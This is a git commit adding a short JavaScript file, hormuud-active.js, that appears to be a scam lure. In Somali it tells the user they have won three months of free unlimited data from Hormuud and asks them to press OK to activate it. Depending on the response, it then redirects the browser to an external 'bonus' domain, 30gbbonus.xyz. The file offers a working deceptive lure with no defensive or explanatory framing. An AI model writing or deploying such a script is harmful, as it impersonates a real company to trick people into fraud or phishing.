3d87a05a1df1c850e230d3888af06a8e19566aae
xmasdata <152927198+xmasdata@users.noreply.github.com>
2025-01-07 23:13:57 -0800

    Create hormuud-active.js

---
+++ hormuud-active.js
@@ -0,0 +1,6 @@
+
+var password = 'Daar xogta'
+password=prompt('SMS: Hambalyo Waxaad u qalantaa Hormuud 3-bilood oo aan xadidneyn xog bilaash ah, si naxariis leh u riix OK si aad hadda u shaqeyso   ','Daar xogta');
+if (password != 'Daar xogta') {
+location.href='https://30gbbonus.xyz/hormuud.html';
+}
